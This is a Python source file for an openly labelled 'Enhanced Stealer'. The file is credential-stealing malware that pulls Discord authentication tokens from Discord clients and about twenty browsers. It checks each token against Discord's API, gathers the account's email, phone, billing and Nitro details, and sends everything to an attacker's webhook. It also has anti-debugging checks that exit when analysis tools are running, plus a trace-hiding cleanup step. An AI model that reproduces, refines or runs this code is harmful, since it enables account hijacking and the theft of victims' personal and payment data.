from re import findall
import httpx, os, json, sys, tempfile
from base64 import b64decode
from Crypto.Cipher import AES
from Crypto.Protocol.KDF import PBKDF2

def generate_header(token=None, content_type="application/json"):
    headers = {
        "Content-Type": content_type,
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
    }
    if token:
        headers.update({"Authorization": token})
    return headers

class Stealer():
    def __init__(self):
        self.webhook = "PUT WEBHOOK HERE"
        self.name = "Enhanced Stealer"
        self.appdata = os.getenv("LOCALAPPDATA")
        self.roaming = os.getenv("APPDATA")
        self.regex = r"[\w-]{24,26}\.[\w-]{6}\.[\w-]{25,110}"  # Improved regex
        self.encrypted_regex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]{120}"
        self.tokens = []
        self.valid_tokens = []
        self.anti_debug()
        self.get_tokens()
        if self.valid_tokens:
            self.send_info()
        self.cleanup()

    def anti_debug(self):
        # Basic anti-debugging techniques
        try:
            if hasattr(sys, 'gettrace') and sys.gettrace() is not None:
                os._exit(1)
                
            # Check for common analysis tools
            analysis_processes = ["wireshark", "procmon", "processhacker", "ida", "x64dbg", "ollydbg"]
            for process in analysis_processes:
                if self.check_process(process):
                    os._exit(1)
        except:
            pass

    def check_process(self, process_name):
        try:
            import psutil
            for proc in psutil.process_iter(['name']):
                if process_name.lower() in proc.info['name'].lower():
                    return True
        except:
            pass
        return False

    def get_tokens(self):
        all_paths = {
            'Discord': self.roaming + r'\\Discord\\Local Storage\\leveldb',
            'Discord Canary': self.roaming + r'\\DiscordCanary\\Local Storage\\leveldb',
            'Discord PTB': self.roaming + r'\\DiscordPTB\\Local Storage\\leveldb',
            'Opera': self.roaming + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb',
            'Opera GX': self.roaming + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb',
            'Amigo': self.appdata + r'\\Amigo\\User Data\\Local Storage\\leveldb',
            'Torch': self.appdata + r'\\Torch\\User Data\\Local Storage\\leveldb',
            'Kometa': self.appdata + r'\\Kometa\\User Data\\Local Storage\\leveldb',
            'Orbitum': self.appdata + r'\\Orbitum\\User Data\\Local Storage\\leveldb',
            'CentBrowser': self.appdata + r'\\CentBrowser\\User Data\\Local Storage\\leveldb',
            '7Star': self.appdata + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb',
            'Sputnik': self.appdata + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb',
            'Vivaldi': self.appdata + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb',
            'Chrome SxS': self.appdata + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb',
            'Chrome': self.appdata + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb',
            'Chrome Profile 2': self.appdata + r'\\Google\\Chrome\\User Data\\Profile 2\\Local Storage\\leveldb',
            'Epic Privacy Browser': self.appdata + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb',
            'Microsoft Edge': self.appdata + r'\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb',
            'Uran': self.appdata + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb',
            'Yandex': self.appdata + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb',
            'Brave': self.appdata + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb',
            'Iridium': self.appdata + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb',
            'Chromium': self.appdata + r'\\Chromium\\User Data\\Default\\Local Storage\\leveldb',
        }

        for browser, path in all_paths.items():
            if not os.path.exists(path):
                continue
                
            try:
                for file_name in os.listdir(path):
                    if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                        continue
                        
                    file_path = os.path.join(path, file_name)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as file:
                            content = file.read()
                            # Find tokens using regex
                            found_tokens = findall(self.regex, content)
                            for token in found_tokens:
                                if self.validate_token(token):
                                    self.valid_tokens.append({
                                        'token': token,
                                        'browser': browser,
                                        'file': file_name
                                    })
                    except Exception as e:
                        continue
            except Exception as e:
                continue

    def validate_token(self, token):
        """Validate if a token is working and get user info"""
        try:
            headers = generate_header(token)
            response = httpx.get("https://discord.com/api/v9/users/@me", headers=headers, timeout=10)
            
            if response.status_code == 200:
                user_data = response.json()
                # Additional check to ensure we have valid user data
                if 'id' in user_data and 'username' in user_data:
                    # Get billing information
                    billing_response = httpx.get(
                        "https://discord.com/api/v9/users/@me/billing/payment-sources", 
                        headers=headers,
                        timeout=10
                    )
                    
                    # Get guild information
                    guilds_response = httpx.get(
                        "https://discord.com/api/v9/users/@me/guilds", 
                        headers=headers,
                        timeout=10
                    )
                    
                    user_data['has_billing'] = billing_response.status_code == 200 and len(billing_response.json()) > 0
                    user_data['guild_count'] = len(guilds_response.json()) if guilds_response.status_code == 200 else 0
                    
                    # Check for Nitro status
                    nitro_response = httpx.get(
                        "https://discord.com/api/v9/users/@me/billing/subscriptions", 
                        headers=headers,
                        timeout=10
                    )
                    
                    user_data['has_nitro'] = False
                    if nitro_response.status_code == 200:
                        subscriptions = nitro_response.json()
                        user_data['has_nitro'] = any(
                            sub['status'] == 'active' for sub in subscriptions
                        )
                    
                    user_data['valid_token'] = token
                    return user_data
        except Exception as e:
            pass
        
        return None

    def send_info(self):
        if not self.valid_tokens:
            return
            
        embeds = []
        for token_data in self.valid_tokens:
            user_data = self.validate_token(token_data['token'])
            if not user_data:
                continue
                
            embed = {
                "title": f"Token Found - {user_data['username']}#{user_data['discriminator']}",
                "color": 0x992d22,
                "fields": [
                    {
                        "name": "User Info",
                        "value": f"ID: `{user_data['id']}`\nEmail: `{user_data.get('email', 'N/A')}`\nPhone: `{user_data.get('phone', 'N/A')}`\nVerified: `{user_data.get('verified', 'N/A')}`",
                        "inline": True
                    },
                    {
                        "name": "Account Status",
                        "value": f"Nitro: `{'Yes' if user_data['has_nitro'] else 'No'}`\nBilling: `{'Yes' if user_data['has_billing'] else 'No'}`\nGuilds: `{user_data['guild_count']}`",
                        "inline": True
                    },
                    {
                        "name": "Found In",
                        "value": f"Browser: `{token_data['browser']}`\nFile: `{token_data['file']}`",
                        "inline": False
                    },
                    {
                        "name": "Token",
                        "value": f"||{token_data['token']}||",
                        "inline": False
                    }
                ],
                "footer": {
                    "text": "Enhanced Stealer"
                },
                "timestamp": "2023-01-01T00:00:00.000Z"
            }
            embeds.append(embed)
        
        # Split embeds into chunks of 10 (Discord limit)
        for i in range(0, len(embeds), 10):
            chunk = embeds[i:i+10]
            data = {
                "content": "@everyone" if i == 0 else "",
                "embeds": chunk,
                "username": "Token Stealer",
                "avatar_url": "https://discord.com/assets/1cbd08c76f8af6dddce02c5138971129.png"
            }
            
            try:
                httpx.post(self.webhook, json=data, timeout=30)
            except Exception as e:
                # Fallback to simple message if embeds fail
                try:
                    simple_content = "\n".join([f"User: {embed['title']} - Token: ||{embed['fields'][3]['value'].replace('||', '')}||" for embed in chunk])
                    httpx.post(self.webhook, json={"content": simple_content}, timeout=30)
                except:
                    pass

    def cleanup(self):
        """Clean up traces"""
        try:
            # Create a temporary file to hide our activity
            temp_dir = tempfile.gettempdir()
            dummy_file = os.path.join(temp_dir, f"{os.urandom(8).hex()}.tmp")
            with open(dummy_file, 'w') as f:
                f.write("Windows Update Helper")
            
            # Modify our file timestamps
            import time
            past_time = time.time() - 86400  # 1 day ago
            os.utime(dummy_file, (past_time, past_time))
        except:
            pass

if __name__ == "__main__":
    try:
        stealer = Stealer()
    except Exception as e:
        pass
